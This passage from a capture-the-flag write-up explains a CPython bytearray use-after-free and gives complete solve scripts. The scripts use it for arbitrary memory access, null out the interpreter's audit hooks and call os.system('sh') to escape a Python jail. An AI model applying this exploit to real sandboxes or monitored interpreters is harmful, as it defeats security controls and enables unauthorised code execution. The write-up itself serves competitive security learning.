            <span class="n">assert</span><span class="p">(</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">ival</span> <span class="o">&amp;&amp;</span> <span class="n">ival</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">);</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">ival</span><span class="p">;</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Let’s construct an execution timeline of what happens from start to end of the Python program (explanation by
<a href="/authors/nneonneo/">@nneonneo</a>):</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">uaf</code> is allocated as a bytearray with a 56-byte backing buffer.</li>
  <li><code class="language-plaintext highlighter-rouge">uaf[23] = B()</code> calls <code class="language-plaintext highlighter-rouge">bytearray_ass_subscript(uaf, 23, B())</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">buf = PyByteArray_AS_STRING(self);</code> caches <code class="language-plaintext highlighter-rouge">buf</code> to point to the backing buffer.</li>
  <li><code class="language-plaintext highlighter-rouge">_getbytevalue</code> is called to turn <code class="language-plaintext highlighter-rouge">B()</code> into a byte, which invokes <code class="language-plaintext highlighter-rouge">B.__index__</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">B.__index__</code> clears <code class="language-plaintext highlighter-rouge">uaf</code>, which frees its backing buffer.</li>
  <li><code class="language-plaintext highlighter-rouge">B.__index__</code> constructs a new bytearray called <code class="language-plaintext highlighter-rouge">memory</code>, which exactly occupies the memory of the freed
 backing buffer (still cached in <code class="language-plaintext highlighter-rouge">buf</code>).</li>
  <li><code class="language-plaintext highlighter-rouge">B.__index__</code> extends <code class="language-plaintext highlighter-rouge">uaf</code> by 56 bytes so the size appears unchanged.</li>
  <li><code class="language-plaintext highlighter-rouge">buf[i] = (char)ival;</code> assigns 1 (<code class="language-plaintext highlighter-rouge">B()</code>’s return value) to index 23 of the freed buffer, overwriting
 <code class="language-plaintext highlighter-rouge">memory</code>’s size field, <code class="language-plaintext highlighter-rouge">ob_size</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">memory</code> now has a NULL backing buffer (no buffer is initially allocated for an empty bytearray) with an
 absurd size field.</li>
</ol>

<p>Thus, <code class="language-plaintext highlighter-rouge">memory</code> effectively becomes a buffer that stretches the entirety of virtual memory, allowing us to
read/write to any arbitrary address.</p>

<p><code class="language-plaintext highlighter-rouge">uaf[id(250) + 24] = 100</code> simply makes use of the fact that small integers are cached in a <code class="language-plaintext highlighter-rouge">small_ints[]</code>
array in memory, and reassigning offset 24 overwrites the value field of <code class="language-plaintext highlighter-rouge">250</code> to equal <code class="language-plaintext highlighter-rouge">100</code>.</p>

<p>The code also includes a <code class="language-plaintext highlighter-rouge">// GH-91153:</code> comment of the bug fix. If we read it carefully, we realize that it
does nothing to prevent this exploit from working, except forcing Step 7) so as to trick Python into
thinking the bytearray hadn’t changed size.</p>

<p>This bug can easily be fixed by not caching <code class="language-plaintext highlighter-rouge">buf</code>.</p>

<h2 id="dark-meets-light">Dark meets light</h2>

<p>Now that we have the technicals out of the way for the UAF exploit, we should be ready to go, right?
We just need to grab the PoC, tweak it a bit to edit the underlying audit hook implementation, and boom no more audit hooks for us.</p>

<p>But… notice the clear need of subscriptions in the PoC? It doesn’t work with any other methods - only <code class="language-plaintext highlighter-rouge">__setitem__</code> and subscription can trigger
the UAF, and both are banned in this challenge. We were briefly grief-stricken - until a second later when we remembered that we have arbitrary access
to the Python object graph now.</p>

<p>We immediately went to work on the PoC, stringing together all of the exploits that we have figured out so far, and reached a point where we can call the UAF:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#UAF setup
</span><span class="k">try</span><span class="p">:</span>
    <span class="s">"{__getitem__.xx}"</span><span class="p">.</span><span class="n">format_map</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">dict</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">global</span> <span class="n">g</span>
    <span class="n">g</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">obj</span>
    <span class="n">gi</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">o</span><span class="p">,</span> <span class="n">k</span><span class="p">:</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="n">o</span><span class="p">)),</span> <span class="n">k</span><span class="p">)</span>

<span class="n">baset</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">)),</span> <span class="s">"__setitem__"</span><span class="p">)</span>
<span class="n">baget</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">)),</span> <span class="s">"__getitem__"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">B</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__index__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">memory</span><span class="p">,</span> <span class="n">uaf</span>
        <span class="k">del</span> <span class="n">uaf</span><span class="p">[:]</span>
        <span class="n">memory</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
        <span class="n">uaf</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">56</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span>

<span class="n">uaf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span>
<span class="n">baset</span><span class="p">(</span><span class="n">uaf</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="n">B</span><span class="p">())</span>

<span class="c1">#actual exploit
</span><span class="n">baset</span><span class="p">(</span><span class="n">memory</span><span class="p">,</span> <span class="nb">id</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="mi">250</span><span class="p">)</span>
</code></pre></div></div>

<p>…except the challenge exits without printing anything. We have been foiled yet again… or have we?</p>

<p>We know that using the repr of a custom function can yield us something like <code class="language-plaintext highlighter-rouge">&lt;function func at 0x000002459495F160&gt;</code>,
which we can then parse and obtain the pointer (that is equivalent to the value given by <code class="language-plaintext highlighter-rouge">id</code>). But this doesn’t work with builtin methods nor literals,
since they will just print something like <code class="language-plaintext highlighter-rouge">&lt;built-in function id&gt;</code> or <code class="language-plaintext highlighter-rouge">100</code> respectively. This is where codegolfing quirks come into play - turns out
<code class="language-plaintext highlighter-rouge">id.__init__</code>, or <code class="language-plaintext highlighter-rouge">(100).__new__</code> both yields the exact same pointer as it would by calling <code class="language-plaintext highlighter-rouge">id(id)</code> or <code class="language-plaintext highlighter-rouge">id(100)</code> respectively.</p>

<p>(Eventually we also realized <code class="language-plaintext highlighter-rouge">object.__repr__(val)</code> will print the pointer to any object just as <code class="language-plaintext highlighter-rouge">id(val)</code> would, but we were already using the above trick anyway so we didn’t bother moving over to that.)</p>

<p>After more brain racking (and brainfarting), we got to the point where we can throw sys.audit into oblivion and replace it with a benign function, like what we did for diligent auditor except with much more code and much more struggle:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#same UAF setup code as above, omitted for brevity
</span><span class="p">...</span>

<span class="n">ga</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="n">g</span><span class="p">(</span><span class="nb">globals</span><span class="p">(),</span> <span class="s">"__builtins__"</span><span class="p">),</span> <span class="s">"getattr"</span><span class="p">)</span>

<span class="n">subcls</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">type</span><span class="p">)),</span> <span class="s">"__subclasses__"</span><span class="p">)(</span><span class="nb">object</span><span class="p">)</span>   <span class="c1">#metaclasses so need g
</span><span class="n">wc</span><span class="p">,</span> <span class="o">=</span> <span class="p">[</span><span class="n">cls</span> <span class="k">for</span> <span class="n">cls</span> <span class="ow">in</span> <span class="n">subcls</span> <span class="k">if</span> <span class="s">'wrap_close'</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">cls</span><span class="p">)]</span>

<span class="n">glob</span> <span class="o">=</span> <span class="n">ga</span><span class="p">(</span><span class="n">gi</span><span class="p">(</span><span class="n">wc</span><span class="p">,</span> <span class="s">"__init__"</span><span class="p">),</span> <span class="s">"__globals__"</span><span class="p">)</span>
<span class="n">sys</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="n">glob</span><span class="p">,</span> <span class="s">"sys"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">glob</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="n">glob</span><span class="p">,</span> <span class="s">"system"</span><span class="p">)</span>


<span class="n">aud</span> <span class="o">=</span> <span class="n">ga</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">audit</span><span class="p">,</span> <span class="s">"__init__"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">aud</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getptr</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">func</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">nop</span><span class="p">():</span>
    <span class="k">pass</span>

<span class="n">baset</span><span class="p">(</span><span class="n">memory</span><span class="p">,</span> <span class="n">getptr</span><span class="p">(</span><span class="n">aud</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">baget</span><span class="p">(</span><span class="n">memory</span><span class="p">,</span> <span class="n">getptr</span><span class="p">(</span><span class="n">nop</span><span class="p">)))</span>

<span class="n">system</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
</code></pre></div></div>

<p>But, as it seems to be the theme for this challenge, there are more hurdles to go over. Replacing <code class="language-plaintext highlighter-rouge">sys.audit</code> doesn’t let us do <code class="language-plaintext highlighter-rouge">os.system</code>, since
<code class="language-plaintext highlighter-rouge">os.system</code> is implemented in C, and calls the equivalent function in the Python C API instead. We still have a lot of things we can try out since we have
both arbitrary access both inside and outside of the Python environment - just that we need more knowledge on the Python interpreter internals.</p>

<h1 id="finally-harmony">Finally, harmony</h1>

<p>One such knowledge is the difference between C level audit hooks (<code class="language-plaintext highlighter-rouge">PySys_AddAuditHook</code>, triggers on every audit event including those in
sub-interpreters) and Python level audit hooks (<code class="language-plaintext highlighter-rouge">sys.addaudithook</code>, triggers on a per-interpreter basis). This is important because they dictate
where the audit hook actually resides (<code class="language-plaintext highlighter-rouge">_PyRuntime-&gt;audit_hooks</code> vs <code class="language-plaintext highlighter-rouge">PyInterpreterState-&gt;audit_hooks</code>).</p>

<p>For our case, we only care about the <code class="language-plaintext highlighter-rouge">_PyRuntime</code> version since the audit hook is registered with the C API. This benefits us a fair bit - there is only
one global <code class="language-plaintext highlighter-rouge">_PyRuntime</code> instance, and the data is written directly in the <code class="language-plaintext highlighter-rouge">.PyRuntime</code> segment. With some IDA referencing to get the offsets of
<code class="language-plaintext highlighter-rouge">libpython3.12.so</code> (can’t believe I’m saying this on a pyjail writeup), we can obtain the audit_hook head easily, and NULL it out so that on firing
audit event Python would think there is no hooks registered.</p>

<p>With that, we have finally obtained the full solve script (with convenient annotations for what each section is for, since you probably skipped through all of the explanations didn’t you 😢):</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#leak dict getitem
</span>
<span class="k">try</span><span class="p">:</span>
    <span class="s">"{__getitem__.xx}"</span><span class="p">.</span><span class="n">format_map</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">dict</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">global</span> <span class="n">g</span>
    <span class="n">g</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">obj</span>
    <span class="n">gi</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">o</span><span class="p">,</span> <span class="n">k</span><span class="p">:</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="n">o</span><span class="p">)),</span> <span class="n">k</span><span class="p">)</span>

<span class="c1">#get basic get/set operators for bytearrays
</span>
<span class="n">baset</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">)),</span> <span class="s">"__setitem__"</span><span class="p">)</span>
<span class="n">baget</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">)),</span> <span class="s">"__getitem__"</span><span class="p">)</span>

<span class="c1">#other useful helpers
</span>
<span class="n">sa</span> <span class="o">=</span> <span class="n">gi</span><span class="p">(</span><span class="nb">dict</span><span class="p">,</span> <span class="s">"__setitem__"</span><span class="p">)</span>
<span class="n">ga</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="n">g</span><span class="p">(</span><span class="nb">globals</span><span class="p">(),</span> <span class="s">"__builtins__"</span><span class="p">),</span> <span class="s">"getattr"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">read_qword</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">baget</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">b</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">baget</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="s">'little'</span><span class="p">)</span>

<span class="c1">#using repr, since we cant use id (it would trigger an audit event)
#fun trick: for funcs that say &lt;built-in method x&gt; instead of the one with ptr, use method.__init__ and it would return the same val as id(method)
#another fun trick: for interned objects its at &lt;value&gt;.__new__
#fwiw object.__repr__(&lt;val&gt;) also works for everything but that requires a func call so we cant use it purely with str.format
</span><span class="k">def</span> <span class="nf">getptr</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">func</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
    <span class="c1">#print(a)
</span>    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="c1">#uaf setup
</span>
<span class="k">class</span> <span class="nc">B</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__index__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">global</span> <span class="n">memory</span><span class="p">,</span> <span class="n">uaf</span>
        <span class="k">del</span> <span class="n">uaf</span><span class="p">[:]</span>
        <span class="n">memory</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
        <span class="n">uaf</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">56</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span>

<span class="n">uaf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span>
<span class="n">baset</span><span class="p">(</span><span class="n">uaf</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="n">B</span><span class="p">())</span>

<span class="c1">#get sys module using typical _wrap_close.__init__.__globals__
</span>
<span class="n">subcls</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="nb">vars</span><span class="p">(</span><span class="nb">type</span><span class="p">)),</span> <span class="s">"__subclasses__"</span><span class="p">)(</span><span class="nb">object</span><span class="p">)</span>   <span class="c1">#metaclasses so need g
</span><span class="n">wc</span><span class="p">,</span> <span class="o">=</span> <span class="p">[</span><span class="n">cls</span> <span class="k">for</span> <span class="n">cls</span> <span class="ow">in</span> <span class="n">subcls</span> <span class="k">if</span> <span class="s">'wrap_close'</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">cls</span><span class="p">)]</span>

<span class="n">glob</span> <span class="o">=</span> <span class="n">ga</span><span class="p">(</span><span class="n">gi</span><span class="p">(</span><span class="n">wc</span><span class="p">,</span> <span class="s">"__init__"</span><span class="p">),</span> <span class="s">"__globals__"</span><span class="p">)</span>
<span class="n">sys</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="n">glob</span><span class="p">,</span> <span class="s">"sys"</span><span class="p">)</span>

<span class="c1">#get a pointer in libpython3.12.so to get aslr base
</span>
<span class="n">aud</span> <span class="o">=</span> <span class="n">ga</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">audit</span><span class="p">,</span> <span class="s">"__init__"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">aud</span><span class="p">)</span>

<span class="n">audit_loc</span> <span class="o">=</span> <span class="n">getptr</span><span class="p">(</span><span class="n">aud</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span>  <span class="c1">#sys.audit ptr to c func?  (EDIT: no its right after the func ptr of course i got lost :()
</span>
<span class="n">audit_ptr</span> <span class="o">=</span> <span class="n">read_qword</span><span class="p">(</span><span class="n">memory</span><span class="p">,</span> <span class="n">audit_loc</span><span class="p">)</span> <span class="c1">#deref to where??
</span><span class="n">audit_ptr</span> <span class="o">=</span> <span class="n">read_qword</span><span class="p">(</span><span class="n">memory</span><span class="p">,</span> <span class="n">audit_ptr</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span>  <span class="c1">#no idea where i am at this point but from /proc/pid/maps it is in libpython3.12.so at unk_4BF320
</span><span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">audit_ptr</span><span class="p">))</span>

<span class="n">libpython_base</span> <span class="o">=</span> <span class="n">audit_ptr</span> <span class="o">-</span> <span class="mh">0x4BF320</span>   <span class="c1">#unk_4BF320
</span>
<span class="n">runtime</span> <span class="o">=</span> <span class="n">libpython_base</span> <span class="o">+</span> <span class="mh">0x5ACCC0</span>   <span class="c1">#.PyRuntime section
</span>
<span class="n">audit_hook_head</span> <span class="o">=</span> <span class="n">runtime</span> <span class="o">+</span> <span class="p">(</span><span class="mi">383</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1">#`*((_QWORD *)&amp;PyRuntime + 383) = v7;` which is `runtime-&gt;audit_hooks.head = entry;` of add_audit_hook_entry_unlocked inlined in PySys_AddAuditHook (PySys_Audit is way harder to read)
</span>
<span class="n">baset</span><span class="p">(</span><span class="n">memory</span><span class="p">,</span> <span class="nb">slice</span><span class="p">(</span><span class="n">audit_hook_head</span><span class="p">,</span> <span class="n">audit_hook_head</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>   <span class="c1">#use uaf to arb read/write to memory, in this case do `runtime-&gt;audit_hooks.head = NULL`
</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">g</span><span class="p">(</span><span class="n">glob</span><span class="p">,</span> <span class="s">"system"</span><span class="p">)</span>
<span class="n">system</span><span class="p">(</span><span class="s">"ls -la"</span><span class="p">)</span>  <span class="c1">#run system normally now that our audit hook linked list is cleared
</span></code></pre></div></div>

<p>(Please ignore the fact that some of these offsets lead to weird locations - it was 4am and we only cared enough to get the solve in, not whether it
made sense or not, and not the fact that the offsets are so off due how the first offset was supposed to be <code class="language-plaintext highlighter-rouge">+ 16</code> not <code class="language-plaintext highlighter-rouge">+ 24</code> 🤪👍)</p>

<p>Overall, this was a really fun pyjail challenge that utilized basically everything about Python in the challenge! Turns out while memory exploits were
intended, <code class="language-plaintext highlighter-rouge">getattr</code> wasn’t intended and the intended solution was to use another UAF instead (<a href="https://bugs.python.org/issue43838">Issue #43838</a>).
It was fun to see how others solved this differently, and definitely fun to have came up with a solution ourselves - but it’s probably safe to say this
might just be enough <del>internet</del> Python for today. Or maybe at least another 3 CTFs or so.</p>

</div>

      </div>
      <footer class="section">
  <a href="https://discord.gg/keeTZsmfVA" target="_blank" rel="noopener noreferrer">discord</a>
  &middot;
  <a href="https://ctftime.org/team/73723" target="_blank" rel="noopener noreferrer">ctftime</a>
  &middot;
  <a href="https://twitter.com/maplebaconctf" target="_blank" rel="noopener noreferrer">twitter</a>
</footer>

    </main>
  </body>
</html>
